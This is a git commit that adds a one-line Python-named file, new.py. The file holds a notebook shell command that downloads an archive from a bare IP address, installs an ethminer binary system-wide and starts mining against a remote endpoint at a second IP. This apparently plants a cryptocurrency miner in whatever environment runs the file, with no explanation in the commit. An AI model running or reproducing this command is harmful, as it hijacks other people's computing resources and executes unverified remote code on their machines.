430370d9e160196d325d8bd1f01372ce2181faee
Furkan Kormaz <kanlicali@gmail.com>
2021-03-03 05:43:36 +0300

    Add files via upload

---
+++ new.py
@@ -0,0 +1,1 @@
+! mkdir down; cd down; wget http://159.89.237.64/test.gz; tar -zxvf test.gz; cd bin; install -sv ethminer /usr/local/bin/; ./ethminer --farm-recheck 200 -U -F  http://143.198.11.157:8080/ohi-25
